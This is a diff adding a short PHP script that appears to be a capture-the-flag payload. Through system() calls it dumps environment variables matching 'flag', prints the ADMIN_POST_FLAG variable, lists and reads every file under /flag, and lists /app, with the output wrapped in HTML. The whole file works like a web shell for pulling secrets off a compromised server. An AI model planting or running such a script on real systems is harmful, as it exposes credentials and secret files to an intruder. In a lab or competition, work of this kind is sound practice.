@@ -1,0 +1,21 @@
+<?php
+echo "<pre>";
+
+echo "===== [ ENV | grep FLAG ] =====\n";
+system("printenv | grep -i flag");
+
+echo "\n===== [ getenv() ] =====\n";
+echo "ADMIN_POST_FLAG = " . getenv("ADMIN_POST_FLAG") . "\n";
+
+echo "\n===== [ ls /flag ] =====\n";
+system("ls -al /flag 2>&1");
+
+echo "\n===== [ cat /flag/* ] =====\n";
+system("cat /flag/* 2>&1");
+
+echo "\n===== [ ls /app ] =====\n";
+system("ls -al /app 2>&1");
+
+echo "\n===== [ done ] =====\n";
+echo "</pre>";
+?>
